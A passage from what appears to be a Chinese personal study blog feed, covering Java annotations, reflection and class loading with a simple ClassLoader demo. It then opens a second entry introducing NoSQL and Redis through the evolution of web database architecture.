<p>自定义注解</p>
</blockquote>
<ul>
<li>使用@ interface自定义注解时，自动继承了 java. lang annotation. Annotation接口。</li>
<li>分析：<ul>
<li>@ interface用来声明一个注解，格式：public@ interface注解名{定义内容}</li>
<li>其中的每一个方法实际上是声明了一个配置参数；</li>
<li>方法的名称就是参数的名称。</li>
<li>返回值类型就是参数的类型（返回值只能是基本类型， Class, String,enum）</li>
<li>可以通过 defau来声明参数的默认值；</li>
<li>如果只有一个参数成员，一般参数名为vaue；</li>
<li>注解元素必须要有值，我们定义注解元素时，经常使用空字符串，0作为默认值</li>
</ul>
</li>
</ul>
<h3 id="2、反射机制"><a href="#2、反射机制" class="headerlink" title="2、反射机制"></a>2、反射机制</h3><h4 id="1-Java反射机制概念"><a href="#1-Java反射机制概念" class="headerlink" title="1.Java反射机制概念"></a>1.Java反射机制概念</h4><blockquote>
<ol>
<li>静态 &amp; 动态语言</li>
</ol>
</blockquote>
<ul>
<li>动态语言<ul>
<li>是一类在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</li>
<li>主要动态语言：Object-C、C#、 JavaScript、PHP、 Python等。</li>
</ul>
</li>
<li>静态语言<ul>
<li>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</li>
<li>Java不是动态语言，但Java可以称之为“准动态语言”。即Java有一定的动态性我们可以利用反射机制获得类似动态语言的特性。Java的动态性让编程的时候更加灵活。</li>
</ul>
</li>
</ul>
<blockquote>
<ol start="2">
<li>反射机制概念</li>
</ol>
</blockquote>
<ul>
<li>Reflection（反射）是Java被视为动态语言的关键，反射机制允许程序在执行期借助于 Reflection AP取得仼何类的内部信息，并能直接操作任意对象的内部属性及方法。<ul>
<li>Class c&#x3D; Class.forName(“java. lang String”);</li>
</ul>
</li>
<li>加载完类之后，在堆內存的方法区中就产生了一个 Class类型的对象（一个类只有一个Cass对象），这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为：反射。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/35703c4b7c062b664191ec914bbb765c--ee70--image-20241006201713560.png" alt="image-20241006201713560"></p>
<blockquote>
<ol start="3">
<li>反射机制研究与应用</li>
</ol>
</blockquote>
<ul>
<li>Java反射机制提供的功能<ul>
<li>在运行时判断任意一个对象所属的类；</li>
<li>在运行时构造任意一个类的对象；</li>
<li>在运行时判断任意一个类所具有的成员变量和方法；</li>
<li>在运行时获取泛型信息；</li>
<li>在运行时调用任意一个对象的成员变量和方法；</li>
<li>在运行时处理注解；</li>
<li>生成动态代理；</li>
<li>……</li>
</ul>
</li>
</ul>
<blockquote>
<ol start="4">
<li>反射机制优缺点</li>
</ol>
</blockquote>
<ul>
<li>优点：<ul>
<li>可以实现动态创建对象和编译，体现出很大的灵活性。</li>
</ul>
</li>
<li>缺点<ul>
<li>对性能有影响。使用反射基本上是一种解释操作，我们可以告诉JVM，我们希望做什么并且它满足我们的要求。这类操作总是慢于直接执行相同的操作。</li>
</ul>
</li>
</ul>
<blockquote>
<p>&#x2F;*<br>        一个类在内存中只有一个Class对象<br>        一个类被加载后,类的整个结构都会被封装在Class对象中<br>        public native int hashCode();返回该对象的hash码值<br>        注：哈希值是根据哈希算法算出来的一个值，这个值跟地址值有关，但不是实际地址值。<br>         *&#x2F;</p>
</blockquote>
<h4 id="2-理解Class类并获取Class实例"><a href="#2-理解Class类并获取Class实例" class="headerlink" title="2.理解Class类并获取Class实例"></a>2.理解Class类并获取Class实例</h4><blockquote>
<ol>
<li>class类介绍</li>
</ol>
</blockquote>
<ul>
<li>在 Object类中定义了以下的方法，此方法将被所有子类继承<ul>
<li>public final Class getclass()</li>
</ul>
</li>
<li>以上的方法返回值的类型是一个 Class类，此类是Java反射的源头，实际上所谓反射从程序的运行结果来看也很好理解，即：可以通过对象反射求出类的名称。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/be9b8c63ed6e11166c584df0ec7d46bd--d62e--image-20241006203510092.png" alt="image-20241006203510092"></p>
<ul>
<li><p>对象照镜子后可以得到的信息：某个类的属性、方法和构造器、某个类到底实现了哪些接口对于每个类而言，JRE都为其保留一个不变的Cass类型的对象。一个Class对象包含了特定某个结构（ class&#x2F;interface&#x2F;enum&#x2F;annotation&#x2F; primitive type&#x2F;void&#x2F;[]）的有关信息。</p>
<ul>
<li>Class本身也是一个类；</li>
<li>Class对象只能由系统建立对象；</li>
<li>一个加载的类在JVM中只会有一个Class实例；</li>
<li>一个Cass对象对应的是一个加载到JM中的一个class文件；</li>
<li>每个类的实例都会记得自己是由哪个Class实例所生成；</li>
<li>通过class可以完整地得到一个类中的所有被加载的结构；</li>
<li>class类是 Reflection的根源，针对任何你想动态加载、运行的类，唯有先获得相应的Class对象。</li>
</ul>
</li>
<li><p>class类的常用方法</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>方法名</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>static ClassforName (String name)</td>
<td>返回指定类名name的class对象</td>
</tr>
<tr>
<td>Object newInstance ()</td>
<td>调用缺省构造函数，返回 Class对象的一个实例</td>
</tr>
<tr>
<td>getName ()</td>
<td>返回此Class对象所表示的实体（类，接口，数组类或void）的名称。</td>
</tr>
<tr>
<td>Class getSuperClass ()</td>
<td>返回当前class对象的父类的class对象</td>
</tr>
<tr>
<td>Class[] getinterfaces ()</td>
<td>获取当前 Class对象的接口</td>
</tr>
<tr>
<td>ClassLoader getclassLoader ()</td>
<td>返回该类的类加载器</td>
</tr>
<tr>
<td>Constructor getConstructors ()</td>
<td>返回一个包含某些 Constructor对象的数组</td>
</tr>
<tr>
<td>Method getMothed (String name, Class…T)</td>
<td>返回一个 Method对象，此对象的形参类型为paramType</td>
</tr>
<tr>
<td>Field[] getDeclaredFields ()</td>
<td>返回Field对象的一个数组</td>
</tr>
</tbody></table>
<blockquote>
<ol start="2">
<li>获取Class类的实例</li>
</ol>
</blockquote>
<ul>
<li>若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高。<ul>
<li>Class clazz&#x3D;Person.class;</li>
</ul>
</li>
<li>已知某个类的实例，调用该实例的 getclass () 方法获取Class对象。<ul>
<li>Class clazz&#x3D; person. getClass();</li>
</ul>
</li>
<li>已知一个类的全类名，且该类在类路径下，可通过class类的静态方法 forName（获取，可能抛出 ClassNotFound Exception。<ul>
<li>Class clazz Class forName（”demo01 Student”);</li>
</ul>
</li>
<li>内置基本数据类型可以直接用类名.Type。</li>
<li>还可以利用 Classloader。</li>
</ul>
<blockquote>
<ol start="3">
<li>哪些类型可以有Class对象</li>
</ol>
</blockquote>
<ul>
<li>class：外部类，成员（成员内部类，静态内部类），局部内部类，匿名内部类。</li>
<li>interface：接口</li>
<li>[]：数组</li>
<li>enum：枚举</li>
<li>annotation：注解@interface </li>
<li>primitive type：基本数据类型</li>
<li>void</li>
</ul>
<h4 id="3-类的加载与ClassLoader"><a href="#3-类的加载与ClassLoader" class="headerlink" title="3.类的加载与ClassLoader"></a>3.类的加载与ClassLoader</h4><blockquote>
<ol>
<li>Java内存分析</li>
</ol>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/9738ef9679770afe7f810b8b1ec303a3--f08b--image-20241006203545571.png" alt="image-20241006203545571"></p>
<blockquote>
<ol start="2">
<li>类的加载</li>
</ol>
</blockquote>
<ul>
<li>当程序主动使用某个类时，如果该类还未被加载到内存中，则系统会通过如下三个步骤来对该类进行初始化。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/248f7b6bdbcc58f556d8a006ec4fd36b--6c52--image-20241006203555990.png" alt="image-20241006203555990"></p>
<ul>
<li>加载：将 class文件字节码內容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后生成一个代表这个类的 java. lang . Class对象。</li>
<li>链接：将Java类的二进制代码合并到JVM的运行状态之中的过程。<ul>
<li>验证：确保加载的类信息符合JVM规范，没有安全方面的问题。</li>
<li>准备：正式为类变量（ static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。</li>
<li>解析：虚拟机常量池内的符号引用（常量名）替换为直接引用（地址）的过程。</li>
</ul>
</li>
<li>初始化：<ul>
<li>执行类构造器&lt; clinit&gt;方法的过程。类构造器&lt; clinit&gt;方法是由编译期自动收集类中所有类变量的赋值动作和静态代码块中的语句合并产生的。（类构造器是构造类信息的，不是构造该类对象的构造器）。</li>
<li>当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。</li>
<li>虛拟机会保证一个类的&lt; clinit &gt;()方法在多线程环境中被正确加锁和同步。</li>
</ul>
</li>
<li><a href="https://blog.csdn.net/m0_38075425/article/details/81627349">深刻理解类加载</a></li>
</ul>
<blockquote>
<ol start="3">
<li>什么时候会发生类初始化</li>
</ol>
</blockquote>
<ul>
<li>类的主动引用（一定会发生类的初始化）<ul>
<li>当虚拟机启动，先初始化main方法所在的类；</li>
<li>new一个类的对象；</li>
<li>调用类的静态成员（除了fina常量）和静态方法；</li>
<li>使用 java. lang. reflect包的方法对类进行反射调用；</li>
<li>当初始化一个类，如果其父类没有被初始化，则先会初始化它的父类。</li>
</ul>
</li>
<li>类的被动引用（不会发生类的初始化）<ul>
<li>当访问一个静态域时，只有真正声明这个域的类才会被初始化。如：当通过子类引用父类的静态变量，不会导致子类初始化；</li>
<li>通过数组定义类引用，不会触发此类的初始化；</li>
<li>引用常量不会触发此类的初始化（常量在链接阶段就存入调用类的常量池中了）。</li>
</ul>
</li>
</ul>
<blockquote>
<ol start="4">
<li>类加载器的作用</li>
</ol>
</blockquote>
<ul>
<li>类加载的作用：将 class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后在堆中生成一个代表这个类的 java. lang Class对象，作为方法区中类数据的访问入口。</li>
<li>类缓存：标准的 JavaSE类加载器可以按要求查找类，但一旦某个类被加载到类加载器中，它将维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些 Class对象</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/9281b634c599b8c2edfac30cb2009a79--e49a--image-20241006203627642.png" alt="image-20241006203627642"></p>
<ul>
<li>类加载器作用是用来把类（αlass）装载进内存的。JVM规范定义了如下类型的类的加载器。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/69b06ba5feeee963329165f6c7e8fae8--1373--image-20241006203652024.png" alt="image-20241006203652024"></p>
<ul>
<li>ClassLoader systemClassLoader &#x3D; ClassLoader.getSystemClassLoader();&#x2F;&#x2F;获取系统类的加载器</li>
<li>ClassLoader parent &#x3D; systemClassLoader.getParent();&#x2F;&#x2F;获取系统类加载器的父类加载器–&gt;扩展类加载器 jre1.8.0_91\lib\ext</li>
<li>ClassLoader parent1 &#x3D; parent.getParent();&#x2F;&#x2F;获取扩展类加载器父类加载器–&gt;根加载器(c&#x2F;c++) jre1.8.0_91\lib\rt.jar</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 获取系统类的加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(systemClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得系统类加载器的父类加载器 ---&gt; 扩展类加载器   jre1.8.0_91\lib\ext</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> systemClassLoader.getParent();</span><br><span class="line">        System.out.println(parent);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取扩展类加载器的父类加载器  --&gt;  根加载器（C/c++）jre1.8.0_91\lib\rt.jar</span></span><br><span class="line">        <span class="comment">// 返回null是正常的，表示为根加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent1</span> <span class="operator">=</span> parent.getParent();</span><br><span class="line">        System.out.println(parent1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试当前类是哪个加载器去加载的</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classDemo1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;ClassDemo1&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(classDemo1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试JDK内置的类是什么加载器加载的</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(classLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得系统类加载器可以加载的路径</span></span><br><span class="line">        System.out.println(System.getProperty(<span class="string">&quot;java.class.path&quot;</span>));</span><br><span class="line">        <span class="comment">//C:\Program Files\Java\jdk1.8.0_202\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\rt.jar;E:\JavaWeb\JVMDemo\out\production\JVMDemo;C:\Program Files\JetBrains\IntelliJ IDEA 2024.2.0.2\lib\idea_rt.jar</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-获取运行类的完整结构"><a href="#4-获取运行类的完整结构" class="headerlink" title="4.获取运行类的完整结构"></a>4.获取运行类的完整结构</h4><ul>
<li><p>通过反射获取运行时类的完整结构</p>
</li>
<li><p>Field、 Method、 Constructor.、 Superclass、 Interface、 Annotation</p>
</li>
<li><p>实现的全部接口</p>
</li>
<li><p>所继承的父类</p>
</li>
<li><p>全部的构造器</p>
</li>
<li><p>全部的方法</p>
</li>
<li><p>全部的Feld</p>
</li>
<li><p>注解</p>
</li>
<li><p>……</p>
</li>
<li><p>在实际的操作中，取得类的信息的操作代码，并不会经常开发。</p>
</li>
<li><p>一定要熟悉 java. lang .reflect包的作用，反射机制。</p>
</li>
<li><p>如何取得属性、方法、构造器的名称，修饰符等。</p>
</li>
</ul>
<h4 id="5-调用运行时类的指定结构"><a href="#5-调用运行时类的指定结构" class="headerlink" title="5.调用运行时类的指定结构"></a>5.调用运行时类的指定结构</h4><blockquote>
<ol>
<li>有Class对象,能做什么</li>
</ol>
</blockquote>
<ul>
<li>创建类的对象：调用 Class对象的 newInstance()方法<ul>
<li>1）类必须有一个无参数的构造器。</li>
<li>2）类的构造器的访问权限需要足够。</li>
</ul>
</li>
<li>思考？难道没有无参的构造器就不能创建对象了吗？只要在操作的时候明确的调用类中的构造器，并将参数传递进去之后，才可以实例化操作。</li>
<li>步骤如下：<ul>
<li>1）通过class类的 getDeclaredConstructor（ Class…， parameterTypes）取得本类的指定形参类型的构造器；</li>
<li>2）向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数。</li>
<li>3）通过 Constructo实例化对象</li>
</ul>
</li>
</ul>
<blockquote>
<p>2、方法及使用</p>
</blockquote>
<p>通过反射，调用类中的方法，通过 Method类完成。</p>
<ul>
<li>①通过Cas类的 getMethod（ String name, Class… parameterTypes）方法取得一个 Method对象，并设置此方法操作时所需要的参数类型。</li>
<li>②之后使用 Object invoke（ Object obj，Object[] args）进行调用，并向方法中传递要设置的ob对象的参数信息。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/7034533d6df0a76a9e47b90fe40965ff--d64e--image-20241007131846399.png" alt="image-20241007131846399"></p>
<blockquote>
<p>调用指定的方法：</p>
</blockquote>
<ul>
<li>Object invoke（object obj, Object. args）</li>
<li>Object对应原方法的返回值，若原方法无返回值，此时返回null；</li>
<li>若原方法若为静态方法，此时形参 Object obj可为null；</li>
<li>若原方法形参列表为空，则 Object[] args为null；</li>
<li>若原方法声明为 private，则需要在调用此 invoke（）方法前，显式调用方法对象的setAccessible（true）方法，将可访问 private的方法。</li>
</ul>
<blockquote>
<p>setAccessible </p>
</blockquote>
<ul>
<li>Method和 Field、 Constructor对象都有 setAccessible()方法。</li>
<li>setAccessible作用是启动和禁用访问安全检查的开关。</li>
<li>参数值为true则指示反射的对象在使用时应该取消Java语言访问检査。<ul>
<li>提高反射的效率。如果代码中必须用反射，而该句代码需要频繁的被调用，那么请设置为true；</li>
<li>使得原本无法访问的私有成员也可以访问；</li>
</ul>
</li>
<li>参数值为false则指示反射的对象应该实施Java语言访问检查。</li>
</ul>
<blockquote>
<ol start="3">
<li>性能检测</li>
</ol>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">经过反复测试得出结论：普通方式执行效率 &gt; 反射关闭检测方式执行效率 &gt; 反射方式执行效率</span><br></pre></td></tr></table></figure>

<h4 id="6-反射操作泛型"><a href="#6-反射操作泛型" class="headerlink" title="6.反射操作泛型"></a>6.反射操作泛型</h4><ul>
<li>Java采用泛型擦除的机制来引入泛型，Java中的泛型仅仅是给编译器javac使用的，确保数据的安全性和免去强制类型转换问题，但是，一旦编译完成，所有和泛型有关的类型全部擦除。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">泛型：</span><br><span class="line">Java 中的泛型仅仅是给编译器 javac 使用的，确保数据的 安全性和免去强制类型转换的麻烦，但是一旦编译完成，所 有与泛型有关的类型全部擦除。</span><br><span class="line">使用泛型直接读取泛型，是读取不到的，因为反射是操作 加载以后的类的。</span><br><span class="line">Java 新增的数据类型：</span><br><span class="line">为了通过反射操作这些类型以迎合实际开发的需要</span><br><span class="line">1) ParameterizedType： 表 示 一 种 参 数 化 的 类 型 ,比 如Collection&lt;String&gt;,可以获取 String 信息</span><br><span class="line">2) GenericArrayType：泛型数组类型</span><br><span class="line">3) TypeVariable：各种类型变量的公共父接口</span><br><span class="line">4) WildcardType：代表一种通配符类型表达式， 比如? extends Number,? super Integer (Wildcard 是一个单词，就是通配符)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么泛型是什么？？？</span><br><span class="line"></span><br><span class="line">泛型 ，顾名思义就是 广泛的数据类型，也就是说什么数据类型都可以。</span><br><span class="line">一般来说，我们见到的泛型就是这个样子，用 T 表示。</span><br><span class="line">如下所示，在类名后方申明泛型 T，接着就可以在成员变量、方法中使用泛型了。</span><br></pre></td></tr></table></figure>

<h4 id="7-反射操作注解"><a href="#7-反射操作注解" class="headerlink" title="7.反射操作注解"></a>7.反射操作注解</h4><ul>
<li>getAnnotations </li>
<li>getAnntation</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/50328b5e689195ee970a7c76472b1ada--b0a1--image-20241007134552563.png"></p>
<h2 id="JAVA-SE总结"><a href="#JAVA-SE总结" class="headerlink" title="JAVA SE总结"></a>JAVA SE总结</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/fd06ebf085a98d84cd36f4775d52280d--5015--Java%20SE.png" alt="Java SE"></p>
]]></content>
  </entry>
  <entry>
    <title>redis学习</title>
    <url>/2024/09/17/redis%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>记录学习NoSQL  Redis</p>
<span id="more"></span>

<h1 id="一、NoSQL概述"><a href="#一、NoSQL概述" class="headerlink" title="一、NoSQL概述"></a>一、NoSQL概述</h1><ul>
<li>NoSQL，指的是<strong>非关系型数据库</strong>。NoSQL有时也称为Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</li>
</ul>
<h2 id="1、为什么要用NoSQL"><a href="#1、为什么要用NoSQL" class="headerlink" title="1、为什么要用NoSQL"></a>1、为什么要用NoSQL</h2><blockquote>
<p>1、单机mysql的年代</p>
</blockquote>
<ul>
<li><p>在早期90年代，一个网站的访问量一般都不大，用单个数据库完全够用。</p>
</li>
<li><p>在那个时代，网站更多使用的都是静态网页，动态交互型界面使用不多。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/74ae8f5de7c59c31894dc4916eb11691--7826--image-20240917194252427.png" alt="image-20240917194252427"></p>
<blockquote>
<p>DAL：Data Access Layer（数据访问层-Hibernate，Mybatis）</p>
</blockquote>
<p>但使用该架构的情况下，也随之存在不少问题，网站存在对应的瓶颈</p>
<ol>
<li>数据量的总大小一个机器放不下时</li>
<li>数据的索引（B+Tree）一个机器的内存放不下时</li>
<li>访问量（读写混合）一个实例Mysql不能接受</li>
</ol>
<p>只要出现上述三种情况之一，可能就会导致网站的无法正常使用，只能对数据库的整体架构进行重构</p>
<blockquote>
<p>2、memcached（缓存）+mysql+垂直拆分（读写分离）</p>
</blockquote>
<ul>
<li>随着网站访问量的不断上升，几乎大部分使用单机mysql架构的网站在数据库上都出现了性能问题</li>
<li>随之而来的实际，使用缓存技术来环节数据库的压力，优化数据库结构和索引。。开始比较流行的是通过文件缓存来缓解数据库压力，但是当访问量继续增大的时候，多台web机器通过文件缓存不能共享，大量的小文件缓存也带了了比较高的IO压力。</li>
<li>在这个时候，Memcached就自然的成为一个非常时尚的技术产品。</li>
<li>网站80%的情况都是在读，每次都要去查询数据库的话就十分的麻烦！所以说我们希望减轻数据的压力，我们可以使用缓存来保证效率！</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/13b5c05c18f27f7137ded7fa5cab0482--f695--image-20240917195408498.png" alt="image-20240917195408498"></p>
<ul>
<li>Memcached作为一个独立的分布式的缓存服务器，为多个web服务器提供了一个共享的高性能缓存服务，在Memcached服务器上，又发展了根据hash算法来进行多台Memcached缓存服务的扩展，然后又出现了一致性hash来解决增加或减少缓存服务器导致重新hash带来的大量缓存失效的弊端。</li>
<li>由于数据库的写入压力增加，Memcached只能缓解数据库的读取压力。读写集中在一个数据库上让数据库不堪重负，大部分网站开始使用主从复制技术来达到<strong>读写分离</strong>，以提高读写性能和读库的可扩展性。Mysql的master-slave模式成为这个时候的网站标配了。</li>
</ul>
<blockquote>
<p>3、分库分表+水平拆分+mysql集群</p>
</blockquote>
<ul>
<li>本质：数据库的读写</li>
<li>早些年的MyISAM：表锁，十分影响效率，高并发情况下就会出现严重的锁问题</li>
<li>当下的转战Innodb：行锁</li>
<li>技术和业务在发展的同时，对人的要求也越来越高！</li>
<li>慢慢的就开始使用分库分表来解决写的压力！MySQL在某个年代推出了表分区，但并没有什么公司用！</li>
<li>为满足需求，随之诞生的则是MySQL的集群，很好满足那个时代的所有需求！</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/66ca9710d7e23fe4ea3cec952545b379--1556--image-20240917200604469.png" alt="image-20240917200604469"></p>
<blockquote>
<p>4、如今最近的年代</p>
</blockquote>
<ul>
<li>2010-2020十年之间，世界已经发生了翻天覆地的变化；（定位，音乐。热榜也是一种数据）</li>
<li>MySQL等关系型数据库就不够用了！当下数据量很多（大数据时代），变化很快！</li>
<li>MySQL用它存储一些比较大的文件，效率就低了，比如博客，图片等！如果有一种数据库去专门处理这种数据。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/7fdcc82c9489aaca67f2f368789f63f1--03fc--image-20240917202025446.png" alt="image-20240917202025446"></p>
<p>最前面的是企业级防火墙，后面通过负载均衡主机（软负载：Nginx，硬负载：F5）在 web 服务器集群之间进行调度，再由具体的 web 服务器（Tomcat）去访问缓存，访问数据库。</p>
<blockquote>
<p>为什么要nosql</p>
</blockquote>
<p>今天我们可以通过第三方平台（如：Google,Facebook等）可以很容易的访问和抓取数据。用户的个人信息，社交网络，地理位置，用户生成的数据和用户操作日志已经成倍的增加。我们如果要对这些用户数据进行挖掘，那SQL数据库已经不适合这些应用了, NoSQL数据库的发展也却能很好的处理这些大的数据。</p>
<h2 id="2、什么是NoSQL"><a href="#2、什么是NoSQL" class="headerlink" title="2、什么是NoSQL"></a>2、什么是NoSQL</h2><blockquote>
<p>NoSQL</p>
</blockquote>
<p>NoSQL &#x3D; Not Only SQL（不仅仅是SQL）</p>
<p>关系型数据库：表格 （行 ，列）</p>
<p>泛指非关系型数据库的，随着web2.0互联网的诞生！传统的关系型数据库很难对付web2.0时代！尤其是超大规模的高并发的社区！ 暴露出来很多难以克服的问题，NoSQL在当今大数据环境下发展的十分迅速，Redis是发展最快的，而且是我们当下必须要掌握的一个技术！</p>
<p>很多的数据类型用户的个人信息，社交网络，地理位置。这些数据类型的存储不需要一个固定的格式！不需要多余的操作就可以横向扩展的 ！ <strong>Map&lt;String,Object&gt; 使用键值对来控制！</strong></p>
<blockquote>
<p>NoSQL特点</p>
</blockquote>
<p><strong>解耦！！</strong></p>
<ul>
<li><p>方便拓展（数据之间没有关系，很好扩展！）</p>
</li>
<li><p>大数据量高性能（Redis一秒写8万次，读取11万，NoSQL的缓存记录级，是一种细粒度的缓存，性能会比较高）</p>
</li>
<li><p>数据类型是多样型的！（不需要事先设计数据库！随取随用！如果数据量非常大的表，很多人就无法设计了）</p>
</li>
<li><p>传统RDBMS（关系型数据库）和NoSQL的对比</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">传统的 RDBMS</span><br><span class="line">- 高度组织化结构化数据</span><br><span class="line">- 结构化查询语言（SQL）</span><br><span class="line">- 数据和关系都存储在单独的表中。</span><br><span class="line">- 数据操纵语言，数据定义语言</span><br><span class="line">- 严格的一致性</span><br><span class="line">- 基础事务 </span><br><span class="line">- .....</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nosql </span><br><span class="line">- 代表着不仅仅是SQL</span><br><span class="line">- 没有声明性查询语言</span><br><span class="line">- 没有预定义的模式</span><br><span class="line">- 键值对存储，列存储，文档存储，图形数据库</span><br><span class="line">- 最终一致性，而非ACID属性</span><br><span class="line">- 非结构化和不可预知的数据</span><br><span class="line">- CAP定理(C：强一致性 A：高可用性 P：分布式容忍性)</span><br><span class="line">- 高性能，高可用性和可伸缩性</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>理解：3V+3高</p>
</blockquote>
<p>大数据时代的3V：主要是描述问题的</p>
<ol>
<li>海量Volume</li>
<li>多样Variety</li>
<li>实时Velocity</li>
</ol>
<p>大数据时代的3高：主要是对程序的要求</p>
<ol>
<li><strong>高并发</strong></li>
<li><strong>高可扩</strong></li>
<li><strong>高性能</strong></li>
</ol>
<p>真正在公司中的实践：NoSQL + RDBMS 一起使用才是最强的，阿里巴巴的架构演进！</p>
<h2 id="3、阿里巴巴演进分析"><a href="#3、阿里巴巴演进分析" class="headerlink" title="3、阿里巴巴演进分析"></a>3、阿里巴巴演进分析</h2><p>思考问题：这么多东西难道都是在一个数据库中的吗?</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/4414c8742049d823bf81956bb7e3fb8b--cc92--image-20240917204812689.png" alt="image-20240917204812689"></p>
<p>技术急不得，越是慢慢学，才能越扎实！</p>
<p>开源才是技术的王道！</p>
<p>任何一家互联网的公司，都不可能只是简简单单让用户能用就好了</p>
<p>大量公司做的都是相同的业务（竞品协议）</p>
<p>随着这样的竞争，业务是越来越完善，然后对于开发者的要求也是越来越高</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/b3e70a7822276f757b5937187b81f21f--63fe--image-20240917204835195.png" alt="image-20240917204835195"></p>
<p>如果你未来相当一个架构师： 没有什么是加一层解决不了的</p>
